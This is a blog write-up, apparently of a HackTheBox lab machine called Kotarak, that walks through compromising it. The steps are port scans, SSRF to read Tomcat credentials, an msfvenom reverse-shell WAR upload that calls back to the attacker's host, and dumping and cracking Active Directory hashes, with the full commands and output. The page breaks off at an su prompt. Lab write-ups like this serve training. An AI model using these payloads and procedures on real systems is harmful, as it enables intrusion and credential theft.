@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Kotarak | Initial nmap root@SittingDucks:~# nmap -p- -sV 10.10.10.55 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 17:23 GMT Nmap scan report for...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Kotarak</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-01-22 17:29:00+00:00">Wed 22 January 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Kotarak.html">Kotarak</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Kotarak.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="initial-nmap">Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p- -sV <span class="m">10</span>.10.10.55
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 17:23 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.55</span>
+<span class="go">Host is up (0.014s latency).</span>
+<span class="go">Not shown: 65531 closed ports</span>
+<span class="go">PORT      STATE SERVICE VERSION</span>
+<span class="go">22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)</span>
+<span class="go">8080/tcp  open  http    Apache Tomcat 8.5.5</span>
+<span class="go">60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 66.83 seconds</span>
+</pre></div>
+
+
+<p>Let's try to browse to both tomcat and httpd ports:</p>
+<p><img alt="" src="../images/kotarak-tomcat.png"></p>
+<p><img alt="" src="../images/kotarak-private-browser.png"></p>
+<p>I also run a directories scan with gobuster on port 8080:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> gobuster dir -u http://kotarak.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">5</span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://kotarak.htb:8080</span>
+<span class="go">[+] Threads:        5</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/01/23 05:22:32 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/docs (Status: 302)</span>
+<span class="go">/examples (Status: 302)</span>
+<span class="go">/manager (Status: 302)</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/01/23 05:32:47 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>and I do the same on port 60000:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> gobuster dir -u http://kotarak.htb:60000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">5</span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1                                                                                </span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://kotarak.htb:60000                                                   </span>
+<span class="go">[+] Threads:        5                                                                          </span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403                   </span>
+<span class="go">[+] User Agent:     gobuster/3.0.1                                                             </span>
+<span class="go">[+] Timeout:        10s                                                                        </span>
+<span class="go">===============================================================          </span>
+<span class="go">2020/01/23 05:34:51 Starting gobuster                                                          </span>
+<span class="go">===============================================================</span>
+<span class="go">/server-status (Status: 403)                                                                   </span>
+<span class="go">===============================================================</span>
+<span class="go">2020/01/23 05:45:17 Finished                                                                   </span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>I explored the directories gobuster and found the following admin panel login page:</p>
+<p><img alt="" src="../images/kotarak-tomcat-manager.png"></p>
+<p>Having access to that portal would be giving us access to tomcat management interface which in turn can lead to other potential accesses.</p>
+<p><img alt="" src="../images/kotarak-server-status.png"></p>
+<p>As shown above navigating to the box on port 60000 in the directory <strong>server-status</strong> found by gobuster shows a permission error. This page usually provide very useful information that we could use for our attack.</p>
+<p>For the Private Browser to do its job there must be some kind of mechanisms in the back-end, potentially another server or application that "makes things private". In fact, I suspect that when we enter the URL in the Private Browser this is then passed to the relevant back-end API endpoint to be processed and in turn the endpoint will respond with the private data.</p>
+<p>The mechanism I explained above is ideal for an SSRF (Server Side Request Forgery) which is very well explained <a href="https://portswigger.net/web-security/ssrf">here</a>. </p>
+<p>With this nice explanation in mind I will try to add the Browser and see what happens.</p>
+<p><img alt="" src="../images/kotarak-ssrf.png"></p>
+<p>As we can see we now get access to the <strong>server-status</strong> page we previosly got permissions issues for. This is because now apache which is running on port 60000 receives the request as if it comes from the same host (in fact, we used localhost)</p>
+<p>The <strong>server-status</strong> page shows a list of running processes with listening ports. We can see port 888 is recurring. Browising to localhost on port 888 from the Private Browser we have this:</p>
+<p><img alt="" src="../images/kotarak-888.png"></p>
+<p>I checked inside all the directories and they are all empty. </p>
+<p><img alt="" src="../images/kotarak-backup.png"></p>
+<p>I decide to have a look at this with curl which reveals the follwing output:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> curl http://kotarak.htb:60000/url.php?path<span class="o">=</span>localhost:888/?doc<span class="o">=</span>backup
+<span class="go">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="go">&lt;!--</span>
+<span class="go">  Licensed to the Apache Software Foundation (ASF) under one or more</span>
+<span class="go">  contributor license agreements.  See the NOTICE file distributed with</span>
+<span class="go">  this work for additional information regarding copyright ownership.</span>
+<span class="go">  The ASF licenses this file to You under the Apache License, Version 2.0</span>
+<span class="go">  (the &quot;License&quot;); you may not use this file except in compliance with</span>
+<span class="go">  the License.  You may obtain a copy of the License at</span>
+
+<span class="go">      http://www.apache.org/licenses/LICENSE-2.0</span>
+
+<span class="go">  Unless required by applicable law or agreed to in writing, software</span>
+<span class="go">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span>
+<span class="go">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span>
+<span class="go">  See the License for the specific language governing permissions and</span>
+<span class="go">  limitations under the License.</span>
+<span class="go">--&gt;</span>
+<span class="go">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span>
+<span class="go">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
+<span class="go">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span>
+<span class="go">              version=&quot;1.0&quot;&gt;</span>
+<span class="go">&lt;!--</span>
+<span class="go">  NOTE:  By default, no user is included in the &quot;manager-gui&quot; role required</span>
+<span class="go">  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,</span>
+<span class="go">  you must define such a user - the username and password are arbitrary. It is</span>
+<span class="go">  strongly recommended that you do NOT use one of the users in the commented out</span>
+<span class="go">  section below since they are intended for use with the examples web</span>
+<span class="go">  application.</span>
+<span class="go">--&gt;</span>
+<span class="go">&lt;!--</span>
+<span class="go">  NOTE:  The sample user and role entries below are intended for use with the</span>
+<span class="go">  examples web application. They are wrapped in a comment and thus are ignored</span>
+<span class="go">  when reading this file. If you wish to configure these users for use with the</span>
+<span class="go">  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds</span>
+<span class="go">  them. You will also need to set the passwords to something appropriate.</span>
+<span class="go">--&gt;</span>
+<span class="go">&lt;!--</span>
+<span class="go">  &lt;role rolename=&quot;tomcat&quot;/&gt;</span>
+<span class="go">  &lt;role rolename=&quot;role1&quot;/&gt;</span>
+<span class="go">  &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;</span>
+<span class="go">  &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;</span>
+<span class="go">  &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;</span>
+<span class="go">--&gt;</span>
+<span class="go">    &lt;user username=&quot;admin&quot; password=&quot;3@g01PdhB!&quot; roles=&quot;manager,manager-gui,admin-gui,manager-script&quot;/&gt;</span>
+
+<span class="go">&lt;/tomcat-users&gt;</span>
+</pre></div>
+
+
+<p>In the last line we can see a username and password. Let's see if we can use these credentials to login in the tomcat management panel.</p>
+<p>And we are in!</p>
+<p><img alt="" src="../images/kotarak-login-ok.png">
+<img alt="" src="../images/kotarak-war.png"></p>
+<p>The bottom part of the page shows a section we can use to upload a <a href="https://en.wikipedia.org/wiki/WAR_(file_format)">war</a> file to the server. We can leverage this and upload some code in a war file which can give us a shell back.</p>
+<p>Before to do that I wanted to point out that this time we were lucky because we were able to see the <strong>server-status</strong> page which reveaed port 888 and by digging we also find the credentials. What if the page wasn't accessible? In this case there is another thing we could do. The same way we tested port 888 by inserting the string "localhost:888" in the Private Browser search field (or using curl), we can test the other ports:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> curl http://kotarak.htb:60000/url.php?path<span class="o">=</span>localhost:22
+<span class="go">SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</span>
+<span class="go">Protocol mismatch.</span>
+</pre></div>
+
+
+<p>The above is a test on port 22 which reveales the port is open. Technically we can write a little script that tries all the ports automatically. However there is already a tool in kali that can do these kind of things, <strong>wfuzz</strong>.</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> wfuzz -c -z range,1-65535 --hl<span class="o">=</span><span class="m">2</span> http://kotarak.htb:60000/url.php?path<span class="o">=</span>localhost:FUZZ
+
+<span class="go">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span>
+
+<span class="go">********************************************************</span>
+<span class="go">* Wfuzz 2.4 - The Web Fuzzer                           *</span>
+<span class="go">********************************************************</span>
+
+<span class="go">Target: http://kotarak.htb:60000/url.php?path=localhost:FUZZ</span>
+<span class="go">Total requests: 65535</span>
+
+<span class="go">===================================================================</span>
+<span class="go">ID           Response   Lines    Word     Chars       Payload                                                                                                                      </span>
+<span class="go">===================================================================</span>
+
+<span class="go">000000022:   200        4 L      4 W      62 Ch       &quot;22&quot;                                                                                                                         </span>
+<span class="go">000000090:   200        11 L     18 W     156 Ch      &quot;90&quot;                                                                                                                         </span>
+<span class="go">000000110:   200        17 L     24 W     187 Ch      &quot;110&quot;                                                                                                                        </span>
+<span class="go">000000200:   200        3 L      2 W      22 Ch       &quot;200&quot;                                                                                                                        </span>
+<span class="go">000000320:   200        26 L     109 W    1232 Ch     &quot;320&quot;                                                                                                                        </span>
+<span class="go">000000888:   200        78 L     265 W    3955 Ch     &quot;888&quot;                                                                                                                        </span>
+<span class="go">000060000:   200        78 L     130 W    1171 Ch     &quot;60000&quot;                                                                                                                      </span>
+<span class="go">000065535:   200        2 L      0 W      2 Ch        &quot;65535&quot;</span>
+</pre></div>
+
+
+<p>As shown above wfuzz revealed other ports opened which we can probably use later. For now let's go back to uploading a war file and get a shell. To generate a shell embedded in a war file we can use msfvenom:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.4 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1234</span> -f war &gt; shell.war
+<span class="go">Payload size: 1089 bytes</span>
+<span class="go">Final size of war file: 1089 bytes</span>
+
+<span class="gp">root@SittingDucks:~#</span> ll
+<span class="go">total 4</span>
+<span class="go">-rw-rw-r-- 1 root root 1089 Jan 24 06:42 shell.war</span>
+</pre></div>
+
+
+<p>Once the war file is ready we upload it from the web page and we can see it in the list of applications:</p>
+<p><img alt="" src="../images/kotarak-shell-upload.png">
+<img alt="" src="../images/kotarak-shell-panel.png"></p>
+<p>Now i set a netcat listener on port 1234 on my kali box and then I click on shell application in the tomcat manager panel (the shell link in the green screenshot above in the left). Once I click to that link I am redirected to this address "http://kotarak.htb:8080/shell/" in the browser and I am able to see this on my kali box:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">1234</span>
+<span class="go">listening on [any] 1234 ...</span>
+<span class="go">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.55] 34780</span>
+<span class="go">whoami</span>
+<span class="go">tomcat</span>
+<span class="go">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="gp">tomcat@kotarak-dmz:/$</span> 
+</pre></div>
+
+
+<p>I ran the above python command to upgrade to an interactive bash shell. We still d*o not have tab-autocomplete, history, etc. so we can do the following to get a complete working shell (from the pty shell):</p>
+<p>hit <code>CTRL+Z</code> to put the shell in the background:</p>
+<div class="highlight"><pre><span></span><span class="gp">tomcat@kotarak-dmz:/$</span> ^Z
+<span class="go"> [1]+  Stopped                 nc -lvnp 1234</span>
+</pre></div>
+
+
+<p>run <code>echo $TERM</code> and <code>stty -a</code> to know the terminal type and the size of the current TTY respectively (rows 54; columns 190;)</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~# echo $</span>TERM
+<span class="go">screen-256color</span>
+</pre></div>
+
+
+<p>and</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> stty -a
+<span class="go">speed 38400 baud; rows 54; columns 190; line = 0;</span>
+<span class="go">intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc</span>
+</pre></div>
+
+
+<p>With the shell still in the background, now set the current STTY to type raw and tell it to echo the input characters with the following         command:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> stty raw -echo
+</pre></div>
+
+
+<p>Now foreground the shell with the <strong>fg</strong> command:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">1234</span>
+<span class="go">                          reset</span>
+<span class="go">reset: unknown terminal type unknown</span>
+<span class="go">Terminal type? screen-256color</span>
+</pre></div>
+
+
+<p>We will have the netcat listener back. Digit <strong>reset</strong> to reinitialize the terminal and when we are asked for the terminal type we add the output of the <strong>echo $TERM</strong> command we ran before.</p>
+<p>After the reset the shell should look normal again. The last step is to set the stty size to match our current kali window (from the info gathered on point 2)</p>
+<div class="highlight"><pre><span></span><span class="gp">tomcat@kotarak-dmz:/$</span> stty rows <span class="m">54</span> columns <span class="m">190</span>
+</pre></div>
+
+
+<p>Now that we have a full interactive shell let's go ahead with getting the user.txt flag.</p>
+<div class="highlight"><pre><span></span><span class="gp">tomcat@kotarak-dmz:/$</span> locate user.txt
+<span class="go">locate user.txt</span>
+<span class="go">/home/atanas/user.txt</span>
+<span class="go">/usr/share/doc/fontconfig/fontconfig-user.txt.gz</span>
+<span class="gp">tomcat@kotarak-dmz:/$</span> cat /home/atanas/user.txt
+<span class="go">cat /home/atanas/user.txt</span>
+<span class="go">cat: /home/atanas/user.txt: Permission denied</span>
+</pre></div>
+
+
+<p>The user.txt is owned by the user atanas and the user tomcat has no permission to read it so we need to find a way to privesc to atanas.</p>
+<p>Before running tools like LinEnum I have a quick look around and found this:</p>
+<div class="highlight"><pre><span></span><span class="gp">tomcat@kotarak-dmz:/home$</span> ls -l
+<span class="go">total 8</span>
+<span class="go">drwxr-xr-x 4 atanas atanas 4096 Aug 29  2017 atanas</span>
+<span class="go">drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 tomcat</span>
+<span class="gp">tomcat@kotarak-dmz:/home$</span> <span class="nb">cd</span> tomcat/
+<span class="gp">tomcat@kotarak-dmz:/home/tomcat$</span> ls -l
+<span class="go">total 4</span>
+<span class="go">drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 to_archive</span>
+<span class="gp">tomcat@kotarak-dmz:/home/tomcat$</span> <span class="nb">cd</span> to_archive/
+<span class="gp">tomcat@kotarak-dmz:/home/tomcat/to_archive$</span> ls -l
+<span class="go">total 4</span>
+<span class="go">drwxr-xr-x 2 tomcat tomcat 4096 Jul 21  2017 pentest_data</span>
+<span class="go">S tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls -l</span>
+<span class="go">total 28304</span>
+<span class="go">-rw-r--r-- 1 tomcat tomcat 16793600 Jul 21  2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit</span>
+<span class="go">-rw-r--r-- 1 tomcat tomcat 12189696 Jul 21  2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="gp">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$</span> file *
+<span class="go">20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data</span>
+<span class="go">20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above</span>
+</pre></div>
+
+
+<p>The <strong><em>.dit</em></strong> extension indicates a Directory Information Tree (DIT) file used by Active Directory, which saves a hierarchy of network objects and access permissions; The <strong><em>.bin</em></strong> is a SYSTEM registry hive file. There is a utility called <strong>impacket-secretsdump</strong> we can use to extract hashes from these files, but first we need to download the files to our kali box:</p>
+<p>I setup a python web server listener on the victim machine and I download both the <strong><em>.dit</em></strong> and <strong><em>.bin</em></strong> files with <code>wget</code> on my box.</p>
+<p>One I have downloaded the file I can use to extract the hashes as follow:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/kotarak#</span> impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL
+<span class="go">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span>
+
+<span class="go">[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399</span>
+<span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span>
+<span class="go">[*] Searching for pekList, be patient</span>
+<span class="go">[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff</span>
+<span class="go">[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit </span>
+<span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::</span>
+<span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="go">WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::</span>
+<span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::</span>
+<span class="go">WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::</span>
+<span class="go">WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::</span>
+<span class="go">WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::</span>
+<span class="go">WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::</span>
+<span class="go">atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span>
+<span class="go">[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit </span>
+<span class="go">Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2</span>
+<span class="go">Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274</span>
+<span class="go">Administrator:des-cbc-md5:75375eda54757c2f</span>
+<span class="go">WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233</span>
+<span class="go">WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74</span>
+<span class="go">WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5</span>
+<span class="go">WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd</span>
+<span class="go">krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8</span>
+<span class="go">krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593</span>
+<span class="go">krbtgt:des-cbc-md5:10ef08047a862046</span>
+<span class="go">krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee</span>
+<span class="go">WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5</span>
+<span class="go">WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908</span>
+<span class="go">WIN2K8$:des-cbc-md5:d352a8d3a7a7380b</span>
+<span class="go">WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487</span>
+<span class="go">WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14</span>
+<span class="go">WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded</span>
+<span class="go">WINXP1$:des-cbc-md5:984a40d5f4a815f2</span>
+<span class="go">WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279</span>
+<span class="go">WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16</span>
+<span class="go">WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734</span>
+<span class="go">WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01</span>
+<span class="go">WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772</span>
+<span class="go">WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42</span>
+<span class="go">WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7</span>
+<span class="go">WIN7$:des-cbc-md5:89a1673723ad9180</span>
+<span class="go">WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c</span>
+<span class="go">atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2</span>
+<span class="go">atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4</span>
+<span class="go">atanas:des-cbc-md5:6b80e391f113542a</span>
+<span class="go">[*] Cleaning up... </span>
+</pre></div>
+
+
+<p>Let's see if we can crack <code>atanas</code> and <code>Administrator</code> hashes. Always before using <code>hashcat</code> or any other tools is good practice to try some online crackers to save time:</p>
+<p><img alt="" src="../images/kotarak-cracked-hashes.png"></p>
+<p>In fact, we were able to crack both hashes as shown above.</p>
+<p><code>atanas: 2b576acbe6bcfda7294d6bd18041b8fe --&gt; Password123!</code></p>
+<p><code>Administrator: e64fe0f24ba2489c05e64354d74ebd11 --&gt; f16tomcat!</code></p>
+<p>I tried to <code>su</code> to atanas and was successful by using the password <code>f16tomcat!</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$</span> su - atanas
+<span class="go">Password: </span>
